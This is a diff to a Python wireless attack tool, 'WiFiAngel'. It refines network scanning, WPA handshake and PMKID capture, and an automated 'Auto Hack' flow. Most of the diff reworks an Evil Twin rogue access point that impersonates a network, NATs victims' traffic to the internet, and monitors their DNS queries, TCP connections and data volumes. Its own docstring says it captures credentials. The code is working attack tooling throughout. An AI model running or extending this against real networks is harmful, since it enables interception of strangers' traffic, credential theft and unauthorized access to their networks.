@@ -64,6 +64,7 @@ from adapters.system_tools import (
     download_speed_rating,
     estimate_upload_mbytes_per_second,
     fallback_upload_mbytes_per_second,
+    managed_name_from_monitor,
     mbytes_to_mbits,
     parse_mac_from_arp_output,
     parse_ping_stats,
@@ -322,22 +323,23 @@ class WiFiAngel:
                 self.logger.error(f"Results update error: {str(e)}")
                 time.sleep(0.1)
 
-    def scan_networks(self):
-        self.logger.info("Starting network scan")
-        self._suppress_live_updates = False
-        try:
-            self.live.start()
-        except Exception:
-            pass
+    def scan_networks(self, *, live_table: bool = True):
+        self.logger.info("Starting network scan (live_table=%s)", live_table)
+        self._suppress_live_updates = not live_table
+        if live_table:
+            try:
+                self.live.start()
+            except Exception:
+                pass
 
         if not hasattr(self, '_networks_lock'):
             self._networks_lock = threading.Lock()
 
-        with ThreadPoolExecutor(max_workers=2) as executor:
-            futures = [
-                executor.submit(self._airodump_scan_loop),
-                executor.submit(self._results_updater),
-            ]
+        max_workers = 2 if live_table else 1
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [executor.submit(self._airodump_scan_loop)]
+            if live_table:
+                futures.append(executor.submit(self._results_updater))
             try:
                 while self.scanning:
                     time.sleep(0.1)
@@ -350,10 +352,11 @@ class WiFiAngel:
                 self.scanning = False
                 self.console.print("\n[bold yellow]Stopping network scan...[/]")
             finally:
-                try:
-                    self.live.stop()
-                except Exception:
-                    pass
+                if live_table:
+                    try:
+                        self.live.stop()
+                    except Exception:
+                        pass
                 self._suppress_live_updates = False
                 for future in futures:
                     try:
@@ -896,8 +899,10 @@ class WiFiAngel:
                         
                         if output_hash.exists() and output_hash.stat().st_size > 0 and not pmkid_found:
                             pmkid_found = True
-                            self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {output_hash}[/]")
-                            self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
+                            # Do not console.print while Live is active — it corrupts the display.
+                            self.logger.info(
+                                f"PMKID captured successfully (continuing). Saved to: {output_hash}",
+                            )
 
                     time.sleep(0.25)
 
@@ -1466,15 +1471,18 @@ class WiFiAngel:
                         handshake_found = True
                         final_handshake = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
                         shutil.move(str(cap_files[0]), str(final_handshake))
-                        self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_handshake}[/]")
-                        self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
-        
+                        self.logger.info(
+                            f"Hybrid: {security_type} handshake saved to {final_handshake} "
+                            "(continuing until Ctrl+C)",
+                        )
+
             if not pmkid_found and pmkid_pcapng.exists():
                 subprocess.run(hcxpcapngtool_convert(pmkid_hash, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 if pmkid_hash.exists() and pmkid_hash.stat().st_size > 0:
                     pmkid_found = True
-                    self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {pmkid_hash}[/]")
-                    self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
+                    self.logger.info(
+                        f"Hybrid: PMKID saved to {pmkid_hash} (continuing until Ctrl+C)",
+                    )
 
         try:
             self.console.print("\n[bold yellow]Important Information:[/]")
@@ -1873,33 +1881,44 @@ class WiFiAngel:
                 f.write(f"Session: {session_timestamp}\n")
                 f.write(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
             
-            # Step 1: Enable monitor mode if not already enabled
+            # Step 1: Enable monitor mode if not already enabled (same path as main menu / WiFiAdapterManager)
             self.console.print("[bold blue]1. Enabling Monitor Mode...[/]")
-            if not self.interface_name.endswith("mon"):
-                subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                subprocess.run(["airmon-ng", "start", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                
-                # Update monitor interface name
-                interfaces = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
-                for line in interfaces.split('\n'):
-                    if "Mode:Monitor" in line:
-                        self.interface_name = line.split()[0]
-                        break
-                
-                self.console.print(f"[success]Monitor mode enabled on {self.interface_name}[/]")
-                self.logger.info(f"Monitor mode enabled on {self.interface_name}")
+            try:
+                mon = self.wifi_adapter.find_monitor_interface()
+                cur_iface_type = self.wifi_adapter.get_interface_type(self.interface_name)
+                if cur_iface_type == "monitor":
+                    self.console.print(f"[success]Already in monitor mode: {self.interface_name}[/]")
+                    self.logger.info(f"Already in monitor mode: {self.interface_name}")
+                elif mon:
+                    self.interface_name = mon
+                    self.console.print(f"[success]Using monitor interface: {self.interface_name}[/]")
+                    self.logger.info(f"Using monitor interface: {self.interface_name}")
+                else:
+                    base = managed_name_from_monitor(self.interface_name)
+                    self.interface_name = self.wifi_adapter.start_monitor_mode(base)
+                    self.console.print(f"[success]Monitor mode enabled on {self.interface_name}[/]")
+                    self.logger.info(f"Monitor mode enabled on {self.interface_name}")
+                    time.sleep(2)
                 with open(report_file, "a") as f:
                     f.write(f"Interface: {self.interface_name} (Monitor Mode)\n")
-                time.sleep(2)
-            else:
-                self.console.print(f"[success]Already in monitor mode: {self.interface_name}[/]")
-                self.logger.info(f"Already in monitor mode: {self.interface_name}")
+            except Exception as e:
+                self.logger.error(f"Auto Hack monitor mode failed: {e}")
+                self.console.print(f"[bold red]Could not enable monitor mode: {e}[/]")
+                return
             
-            # Step 2: Start network scan - SCAN TIME INCREASED TO 60 SECONDS
-            self.console.print("[bold blue]2. Starting Network Scan (60 seconds)...[/]")
+            # Step 2: airodump-ng discovery (same backend as "Start or stop network scan"; no Live table)
+            self.console.print(
+                "[bold blue]2. Network discovery via airodump-ng (60 seconds, same as menu scan)...[/]"
+            )
+            if not hasattr(self, "_networks_lock"):
+                self._networks_lock = threading.Lock()
+            with self._networks_lock:
+                self.networks.clear()
             self.scanning = True
-            scan_thread = threading.Thread(target=self.scan_networks)
-            scan_thread.daemon = True
+            scan_thread = threading.Thread(
+                target=lambda: self.scan_networks(live_table=False),
+                daemon=True,
+            )
             scan_thread.start()
             
             # Wait for initial scan results without using a progress bar
@@ -2765,12 +2784,276 @@ class WiFiAngel:
             # Ensure menu state is properly reset
             self.current_menu = "attack"
 
+    def _ensure_wireless_iface_exists(self, preferred: str) -> str:
+        """Return a wireless netdev that exists under /sys/class/net (handles stale *mon names)."""
+        net_base = Path("/sys/class/net")
+        candidates: list[str] = []
+        if preferred:
+            candidates.append(preferred)
+            base = managed_name_from_monitor(preferred)
+            if base != preferred:
+                candidates.append(base)
+        try:
+            mon = self.wifi_adapter.find_monitor_interface()
+            if mon and mon not in candidates:
+                candidates.append(mon)
+        except Exception:
+            pass
+        for w in self.wifi_adapter.list_wireless_interfaces():
+            if w not in candidates:
+                candidates.append(w)
+        seen: set[str] = set()
+        for name in candidates:
+            if not name or name in seen:
+                continue
+            seen.add(name)
+            if (net_base / name).is_dir():
+                return name
+        raise FileNotFoundError(
+            f"No wireless interface found (expected {preferred!r}). "
+            "Check `ip link` / `iw dev`, or replug the adapter."
+        )
+
+    def _default_ipv4_uplink_interface(self, *, exclude: Optional[set[str]] = None) -> Optional[str]:
+        """Device from ``ip -4 route show default``, excluding AP iface(s)."""
+        skip = exclude or set()
+        try:
+            r = subprocess.run(
+                ["ip", "-4", "route", "show", "default"],
+                capture_output=True,
+                text=True,
+                timeout=5,
+            )
+            if r.returncode != 0 or not r.stdout.strip():
+                return None
+            net_base = Path("/sys/class/net")
+            for line in r.stdout.strip().splitlines():
+                line = line.strip()
+                if not line.startswith("default"):
+                    continue
+                parts = line.split()
+                if "dev" not in parts:
+                    continue
+                idx = parts.index("dev")
+                if idx + 1 >= len(parts):
+                    continue
+                dev = parts[idx + 1]
+                if dev in skip:
+                    continue
+                if (net_base / dev).is_dir():
+                    return dev
+            return None
+        except (subprocess.TimeoutExpired, OSError, ValueError):
+            return None
+
+    def _renew_dhcp_on_interface(self, iface: str) -> None:
+        """Try to refresh DHCP on an interface after NetworkManager stops (best effort)."""
+        if not iface or not (Path("/sys/class/net") / iface).is_dir():
+            return
+        if shutil.which("dhclient"):
+            subprocess.run(
+                ["dhclient", "-1", iface],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
+            )
+        elif shutil.which("dhcpcd"):
+            subprocess.run(
+                ["dhcpcd", "-n", iface],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
+            )
+
+    def _interface_is_wireless(self, iface: str) -> bool:
+        """True if iface is an 802.11 netdev (/sys/.../wireless exists)."""
+        if not iface:
+            return False
+        try:
+            return (Path("/sys/class/net") / iface / "wireless").is_dir()
+        except OSError:
+            return False
+
+    def _evil_twin_nonwifi_internet_uplink_ok(self, uplink: Optional[str]) -> tuple[bool, str]:
+        """
+        Evil Twin internet sharing expects a non-Wi-Fi default route (e.g. Ethernet).
+        Returns (True, "") if uplink exists and is not wireless; (False, reason) otherwise.
+        reason in {"no_uplink", "wifi_uplink"}.
+        """
+        if not uplink:
+            return False, "no_uplink"
+        if self._interface_is_wireless(uplink):
+            return False, "wifi_uplink"
+        return True, ""
+
+    @staticmethod
+    def _evil_twin_parse_dnsmasq_query_lines(lines: list[str]) -> list[tuple[str, str, str, str]]:
+        """Return up to recent rows (time_hint, client_ip, qname, qtype) from dnsmasq log lines."""
+        pat = re.compile(
+            r"query\[([A-Za-z0-9]+)\]\s+(\S+)\s+from\s+(\d{1,3}(?:\.\d{1,3}){3})\b",
+            re.IGNORECASE,
+        )
+        rows: list[tuple[str, str, str, str]] = []
+        for line in lines:
+            if "192.168.1." not in line:
+                continue
+            m = pat.search(line)
+            if not m:
+                continue
+            qtype, qname, client_ip = m.group(1), m.group(2), m.group(3)
+            if not client_ip.startswith("192.168.1."):
+                continue
+            time_hint = ""
+            if "dnsmasq" in line:
+                time_hint = line.split("dnsmasq", 1)[0].strip()
+            rows.append((time_hint, client_ip, qname, qtype))
+        return rows[-25:]
+
+    def _evil_twin_fetch_conntrack_tcp_lan(self) -> list[tuple[str, str, str]]:
+        """NAT-forwarded client TCP: visible via conntrack, not local ss/netstat."""
+        if not shutil.which("conntrack"):
+            return []
+        try:
+            raw = subprocess.check_output(
+                ["conntrack", "-L", "-p", "tcp"],
+                text=True,
+                timeout=10,
+                stderr=subprocess.DEVNULL,
+            )
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError, OSError):
+            return []
+        lan = "192.168.1."
+        out: list[tuple[str, str, str]] = []
+        for line in raw.splitlines():
+            if lan not in line:
+                continue
+            u = line.upper()
+            if "ESTABLISHED" not in u:
+                continue
+            kv: dict[str, str] = {}
+            for tok in line.split():
+                if "=" in tok:
+                    k, _, v = tok.partition("=")
+                    kv[k] = v
+            src, sport = kv.get("src", ""), kv.get("sport", "")
+            dst, dport = kv.get("dst", ""), kv.get("dport", "")
+            if src.startswith(lan):
+                out.append((f"{src}:{sport}", f"{dst}:{dport}", "ESTABLISHED"))
+        return out[-20:]
+
+    @staticmethod
+    def _evil_twin_format_bytes(n: int) -> str:
+        if n <= 0:
+            return "0 B"
+        if n < 1024:
+            return f"{n} B"
+        if n < 1024 * 1024:
+            return f"{n / 1024:.1f} KB"
+        return f"{n / (1024 * 1024):.2f} MB"
+
+    def _evil_twin_conntrack_cli_bytes_for_ip(self, ip: str) -> int:
+        """Sum bytes= from conntrack CLI when /proc parse is empty."""
+        if not ip or not shutil.which("conntrack"):
+            return 0
+        total = 0
+        needles = (f"src={ip}", f"dst={ip}")
+        try:
+            raw = subprocess.check_output(
+                ["conntrack", "-L", "-o", "extended"],
+                text=True,
+                timeout=12,
+                stderr=subprocess.DEVNULL,
+            )
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError):
+            return 0
+        for line in raw.splitlines():
+            if not any(n in line for n in needles):
+                continue
+            for tok in line.split():
+                if tok.startswith("bytes="):
+                    try:
+                        total += int(tok[6:])
+                    except ValueError:
+                        pass
+                    break
+        return total
+
+    def _evil_twin_nf_conntrack_bytes_for_ip(self, ip: str) -> int:
+        """Forwarded/NAT traffic is counted in conntrack, not in iptables FORWARD rule text."""
+        if not ip:
+            return 0
+        path = Path("/proc/net/nf_conntrack")
+        needles = (f"src={ip}", f"dst={ip}")
+        total = 0
+        try:
+            with path.open("r", errors="replace") as fh:
+                for line in fh:
+                    if not any(n in line for n in needles):
+                        continue
+                    for tok in line.split():
+                        if tok.startswith("bytes="):
+                            try:
+                                total += int(tok[6:])
+                            except ValueError:
+                                pass
+                            break
+        except OSError:
+            return self._evil_twin_conntrack_cli_bytes_for_ip(ip)
+        if total > 0:
+            return total
+        return self._evil_twin_conntrack_cli_bytes_for_ip(ip)
+
+    def _evil_twin_fetch_established_tcp_for_lan(self) -> list[tuple[str, str, str]]:
+        """Connections from Evil Twin clients (conntrack NAT) plus local ss/netstat fallback."""
+        ct = self._evil_twin_fetch_conntrack_tcp_lan()
+        if ct:
+            return ct
+
+        lan = "192.168.1."
+        out: list[tuple[str, str, str]] = []
+
+        for cmd in (["ss", "-H", "-tn", "state", "established"], ["ss", "-tn", "state", "established"]):
+            if not shutil.which(cmd[0]):
+                continue
+            try:
+                raw = subprocess.check_output(cmd, text=True, timeout=5, stderr=subprocess.DEVNULL)
+            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError):
+                continue
+            for line in raw.splitlines():
+                line = line.strip()
+                if not line or lan not in line:
+                    continue
+                if "ESTAB" not in line.upper():
+                    continue
+                parts = line.split()
+                if len(parts) < 4:
+                    continue
+                if parts[0] in ("ESTAB", "ESTABLISHED") and len(parts) >= 5:
+                    local, remote = parts[3], parts[4]
+                else:
+                    local, remote = parts[2], parts[3]
+                if lan in local:
+                    out.append((local, remote, "ESTABLISHED"))
+            return out[-15:]
+
+        if shutil.which("netstat"):
+            try:
+                raw = subprocess.check_output(["netstat", "-tn"], text=True, timeout=5)
+            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError):
+                return out
+            for line in raw.splitlines():
+                parts = line.split()
+                if len(parts) >= 6 and parts[5] == "ESTABLISHED" and lan in parts[3]:
+                    out.append((parts[3], parts[4], "ESTABLISHED"))
+        return out[-15:]
+
     def evil_twin_attack(self):
         """Creates an Evil Twin access point to capture credentials"""
         # Store original network settings
         original_settings = {}
         original_interface_name = self.interface_name  # Store original interface name
-        
+        log_dir: Optional[Path] = None
+
         # Clear any existing client data and cache
         try:
             # Clear dnsmasq leases file
@@ -2802,9 +3085,38 @@ class WiFiAngel:
         try:
             # Get original network settings
             self.console.print("[bold blue]Saving original network settings...[/]")
+            try:
+                resolved = self._ensure_wireless_iface_exists(self.interface_name)
+            except FileNotFoundError as e:
+                self.console.print(f"[bold red]{e}[/]")
+                return
+            if resolved != self.interface_name:
+                self.logger.log_evil_twin(
+                    f"Resolved interface {self.interface_name!r} -> {resolved!r} (stale or missing name)"
+                )
+                self.console.print(
+                    f"[yellow]Using interface [cyan]{resolved}[/] "
+                    f"([dim]{self.interface_name}[/] is not present).[/]"
+                )
+                self.interface_name = resolved
+
+            mon_iface = self.wifi_adapter.find_monitor_interface()
+            if mon_iface == self.interface_name:
+                self.console.print(
+                    "[bold blue]Switching to managed mode for Evil Twin AP (hostapd requires AP/managed).[/]"
+                )
+                self.logger.log_evil_twin("Switching monitor interface to managed for hostapd")
+                self.interface_name = self.wifi_adapter.set_managed_mode(
+                    self.interface_name,
+                    restart_network_manager=False,
+                )
+
             original_settings['ip_forward'] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
             original_settings['interface_state'] = subprocess.check_output(["ip", "addr", "show", self.interface_name]).decode()
             original_settings['route_table'] = subprocess.check_output(["ip", "route", "show"]).decode()
+            original_settings["evil_twin_uplink"] = self._default_ipv4_uplink_interface(
+                exclude={self.interface_name}
+            )
             original_settings['iptables'] = subprocess.check_output(["iptables-save"]).decode()
             original_settings['resolved_status'] = subprocess.run(["systemctl", "is-active", "systemd-resolved"], 
                                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
@@ -2854,6 +3166,32 @@ class WiFiAngel:
                     self.console.print("[bold red]Invalid passphrase length! Using default: 12345678[/]")
                     wpa_passphrase = "12345678"
         
+            uplink_precheck = original_settings.get("evil_twin_uplink")
+            uplink_ok, uplink_reason = self._evil_twin_nonwifi_internet_uplink_ok(uplink_precheck)
+            if not uplink_ok:
+                if uplink_reason == "no_uplink":
+                    self.console.print(
+                        "[yellow]No IPv4 default route was found on an interface other than this AP. "
+                        "Plug in Ethernet (or another non-Wi-Fi path to the internet). "
+                        "Clients on the Evil Twin network will probably NOT get online.[/]"
+                    )
+                    self.logger.log_evil_twin("Precheck: no uplink excluding AP iface")
+                else:
+                    self.console.print(
+                        "[yellow]Your current default route uses a Wi-Fi interface (not a wired/other uplink). "
+                        "For reliable client internet, use Ethernet or USB tethering while the AP runs on this adapter. "
+                        "Connected clients may NOT reach the internet.[/]"
+                    )
+                    self.logger.log_evil_twin(f"Precheck: uplink {uplink_precheck!r} is wireless")
+                if Prompt.ask("Continue with Evil Twin anyway?", choices=["y", "n"]) != "y":
+                    self.console.print("[meta]Evil Twin cancelled.[/]")
+                    return
+            elif uplink_precheck:
+                self.console.print(
+                    f"[success]Non-Wi-Fi uplink OK:[/] [cyan]{uplink_precheck}[/] "
+                    "(clients can use NAT/DNS if routing stays up after services stop)."
+                )
+
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             
             # Log Evil Twin attack start
@@ -2885,6 +3223,7 @@ wpa_pairwise=CCMP
 rsn_pairwise=CCMP"""
 
             # Create dnsmasq configuration
+            # Clients must use the AP (192.168.1.1) as DNS so queries are logged; upstream is 8.8.4.4 first.
             dnsmasq_conf = f"""interface={self.interface_name}
 dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
 dhcp-option=3,192.168.1.1
@@ -2896,8 +3235,8 @@ log-async=20
 listen-address=192.168.1.1
 bind-interfaces
 no-resolv
-server=8.8.8.8
 server=8.8.4.4
+server=8.8.8.8
 dhcp-leasefile={log_dir}/dnsmasq.leases"""
 
             # Stop network services
@@ -2908,6 +3247,21 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
             subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
+
+            uplink = original_settings.get("evil_twin_uplink")
+            if uplink and uplink != self.interface_name:
+                self.console.print(f"[bold blue]Refreshing DHCP on uplink {uplink} (internet exit)...[/]")
+                self.logger.log_evil_twin(f"Renewing DHCP on uplink {uplink} after stopping NetworkManager")
+                self._renew_dhcp_on_interface(uplink)
+                time.sleep(2)
+                uplink_live = self._default_ipv4_uplink_interface(exclude={self.interface_name})
+                if uplink_live:
+                    uplink = uplink_live
+                    original_settings["evil_twin_uplink"] = uplink
+                else:
+                    self.console.print(
+                        "[yellow]No default route after NM stop. Use Ethernet (or second NIC) with DHCP for internet uplink.[/]"
+                    )
 
             # Configure interface
             self.console.print("[bold blue]Configuring network interface...[/]")
@@ -2948,17 +3302,107 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 self.logger.log_evil_twin("Failed to start dnsmasq", error=True)
                 raise Exception("Failed to start dnsmasq. Check configuration.")
 
-            # Enable IP forwarding
+            # Enable IPv4 forwarding; NAT/LAN masquerade out the real uplink (was wrongly bound to the AP iface)
             subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Configure iptables
-            self.logger.log_evil_twin("Configuring iptables")
+
+            wan_iface = original_settings.get("evil_twin_uplink")
+            if not wan_iface or wan_iface == self.interface_name:
+                wan_iface = self._default_ipv4_uplink_interface(exclude={self.interface_name})
+            if wan_iface == self.interface_name:
+                wan_iface = None
+            if wan_iface and not (Path("/sys/class/net") / wan_iface).is_dir():
+                wan_iface = None
+
+            self.logger.log_evil_twin("Configuring iptables for Evil Twin internet sharing")
             subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", self.interface_name, "-j", "MASQUERADE"], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface_name, "-j", "ACCEPT"], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            evil_twin_lan = "192.168.1.0/24"
+            if wan_iface:
+                subprocess.run(
+                    [
+                        "iptables",
+                        "-t",
+                        "nat",
+                        "-A",
+                        "POSTROUTING",
+                        "-s",
+                        evil_twin_lan,
+                        "-o",
+                        wan_iface,
+                        "-j",
+                        "MASQUERADE",
+                    ],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+                subprocess.run(
+                    [
+                        "iptables",
+                        "-A",
+                        "FORWARD",
+                        "-i",
+                        self.interface_name,
+                        "-o",
+                        wan_iface,
+                        "-j",
+                        "ACCEPT",
+                    ],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+                subprocess.run(
+                    [
+                        "iptables",
+                        "-A",
+                        "FORWARD",
+                        "-i",
+                        wan_iface,
+                        "-o",
+                        self.interface_name,
+                        "-j",
+                        "ACCEPT",
+                    ],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+                self.console.print(
+                    f"[success]Internet sharing on[/] — NAT [dim]{evil_twin_lan}[/] → [cyan]{wan_iface}[/] "
+                    f"(AP [cyan]{self.interface_name}[/])"
+                )
+                self.logger.log_evil_twin(
+                    f"NAT/forward: LAN {evil_twin_lan} via AP {self.interface_name} masq out {wan_iface}"
+                )
+            else:
+                subprocess.run(
+                    ["iptables", "-A", "FORWARD", "-i", self.interface_name, "-j", "ACCEPT"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+                self.console.print(
+                    "[warning]No WAN uplink detected — clients join the lab AP but may not reach the internet. "
+                    "Connect Ethernet (default route) or a second online interface.[/]"
+                )
+                self.logger.log_evil_twin("No WAN iface; NAT skipped, permissive FORWARD from AP only")
+
+            try:
+                acct = subprocess.run(
+                    ["sysctl", "-n", "net.netfilter.nf_conntrack_acct"],
+                    capture_output=True,
+                    text=True,
+                    timeout=3,
+                )
+                if acct.returncode == 0:
+                    original_settings["nf_conntrack_acct"] = acct.stdout.strip()
+                else:
+                    original_settings["nf_conntrack_acct"] = None
+                subprocess.run(
+                    ["sysctl", "-w", "net.netfilter.nf_conntrack_acct=1"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+            except Exception:
+                original_settings["nf_conntrack_acct"] = None
 
             dnsmasq_log = log_dir / "dnsmasq.log"
             if not dnsmasq_log.exists():
@@ -2967,9 +3411,9 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
             with Live(refresh_per_second=4) as live:
                 start_time = time.time()
                 clients_connected = {}  # Reset clients dictionary
-                dns_queries = []
-                tcp_connections = []
-                
+                tcp_connections: list[tuple[str, str, str]] = []
+                tcp_poll = {"last": 0.0}
+
                 # Create cache directory for this session
                 cache_dir = Path("/tmp/wifiangel_evil_twin")
                 cache_dir.mkdir(exist_ok=True)
@@ -3015,35 +3459,22 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                     
                     status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)
 
-                    # Get current TCP connections (only for Evil Twin network)
-                    if int(time.time()) % 10 == 0:  # Update every 10 seconds
+                    now = time.time()
+                    if now - tcp_poll["last"] >= 5.0:
+                        tcp_poll["last"] = now
                         try:
-                            netstat = subprocess.check_output(["netstat", "-tn"], universal_newlines=True).split("\n")[2:]
-                            tcp_connections = []
-                            for line in netstat:
-                                if "192.168.1." in line:  # Only show connections from Evil Twin network
-                                    conn_parts = line.split()
-                                    tcp_connections.append(conn_parts)
-                                    # Log TCP connection
-                                    if len(conn_parts) >= 6:
-                                        self.logger.log_traffic(
-                                            src=conn_parts[3],
-                                            dst=conn_parts[4],
-                                            bytes_count="N/A",
-                                            protocol="TCP"
-                                        )
-                        except:
+                            tcp_connections = self._evil_twin_fetch_established_tcp_for_lan()
+                        except Exception:
                             tcp_connections = []
 
                     # Create TCP connections table
-                    tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (Updates every 10s)")
+                    tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (refresh ~5s, uses ss/netstat)")
                     tcp_table.add_column("Local Address", style="cyan")
                     tcp_table.add_column("Remote Address", style="green")
                     tcp_table.add_column("State", style="yellow")
                     
-                    for conn in tcp_connections[-10:]:  # Show last 10 connections
-                        if len(conn) >= 6 and conn[5] == "ESTABLISHED" and "192.168.1." in conn[3]:
-                            tcp_table.add_row(conn[3], conn[4], conn[5])
+                    for local, remote, state in tcp_connections:
+                        tcp_table.add_row(local, remote, state)
 
                     # Create DNS queries table
                     dns_table = Table(show_header=True, header_style="bold green", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Recent DNS Queries[/]")
@@ -3052,23 +3483,14 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                     dns_table.add_column("Query", style="yellow")
                     dns_table.add_column("Type", style="magenta")
 
-                    # Read DNS queries from dnsmasq log (only for Evil Twin network)
                     if dnsmasq_log.exists():
-                        with open(dnsmasq_log, "r") as f:
-                            log_content = f.readlines()
-                            for line in log_content[-20:]:  # Show last 20 DNS queries
-                                if "query" in line and "192.168.1." in line:  # Only show queries from Evil Twin network
-                                    try:
-                                        parts = line.split()
-                                        time_str = " ".join(parts[0:3])
-                                        client_ip = parts[parts.index("from") + 1]
-                                        query = parts[parts.index("query") + 1]
-                                        query_type = parts[-1]
-                                        dns_table.add_row(time_str, client_ip, query, query_type)
-                                        # Log DNS query
-                                        self.logger.log_dns_query(client_ip, query, query_type)
-                                    except:
-                                        continue
+                        try:
+                            with open(dnsmasq_log, "r", errors="replace") as f:
+                                dns_parsed = self._evil_twin_parse_dnsmasq_query_lines(f.readlines())
+                            for time_hint, client_ip, query_name, query_type in dns_parsed:
+                                dns_table.add_row(time_hint, client_ip, query_name, query_type)
+                        except OSError:
+                            pass
 
                     # Create clients table
                     clients_table = Table(show_header=True, header_style="bold yellow", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Connected Clients[/]")
@@ -3091,11 +3513,19 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                                         ip = parts[2]
                                         hostname = parts[3]
                                         if ip.startswith("192.168.1."):  # Only show clients from Evil Twin network
-                                            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                            prior = clients_connected.get(mac)
+                                            if (
+                                                prior
+                                                and prior.get("ip") == ip
+                                                and prior.get("connected_since")
+                                            ):
+                                                first_seen = prior["connected_since"]
+                                            else:
+                                                first_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                             current_clients[mac] = {
-                                                'ip': ip,
-                                                'hostname': hostname,
-                                                'connected_since': current_time
+                                                "ip": ip,
+                                                "hostname": hostname,
+                                                "connected_since": first_seen,
                                             }
                                             if mac not in clients_connected:
                                                 # Log new client connection
@@ -3114,39 +3544,22 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                         pass
 
                     for mac, details in clients_connected.items():
-                        # Get data transferred
-                        try:
-                            data = subprocess.check_output(["iptables", "-L", "FORWARD", "-v", "-n", "-x"]).decode()
-                            for line in data.split("\n"):
-                                if details['ip'] in line:
-                                    bytes_str = line.split()[1]
-                                    data_transferred = f"{int(bytes_str)/1024:.2f} KB"
-                                    # Log traffic data
-                                    self.logger.log_traffic(
-                                        src=details['ip'],
-                                        dst="*",
-                                        bytes_count=bytes_str,
-                                        protocol="ALL"
-                                    )
-                                    break
-                            else:
-                                data_transferred = "0 KB"
-                        except:
-                            data_transferred = "N/A"
+                        b = self._evil_twin_nf_conntrack_bytes_for_ip(details["ip"])
+                        data_transferred = self._evil_twin_format_bytes(b)
 
                         clients_table.add_row(
                             mac,
-                            details['ip'],
-                            details['connected_since'],
-                            data_transferred
+                            details["ip"],
+                            details["connected_since"],
+                            data_transferred,
                         )
 
-                    # Update display with all tables
+                    # Update display with all tables (no Panel title: tables already have titles; duplicate titles ghost in Live)
                     live.update(Group(
                         status_table,
-                        Panel(clients_table, title="Connected Clients", border_style=BORDER_STYLE, box=box.MINIMAL),
-                        Panel(dns_table, title="Recent DNS Queries", border_style=BORDER_STYLE, box=box.MINIMAL),
-                        Panel(tcp_table, title="TCP Connections", border_style=BORDER_STYLE, box=box.MINIMAL)
+                        Panel(clients_table, border_style=BORDER_STYLE, box=box.MINIMAL),
+                        Panel(dns_table, border_style=BORDER_STYLE, box=box.MINIMAL),
+                        Panel(tcp_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                     ))
 
                     time.sleep(1)
@@ -3200,6 +3613,14 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 self.logger.log_evil_twin("Resetting IP forwarding")
                 subprocess.run(["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
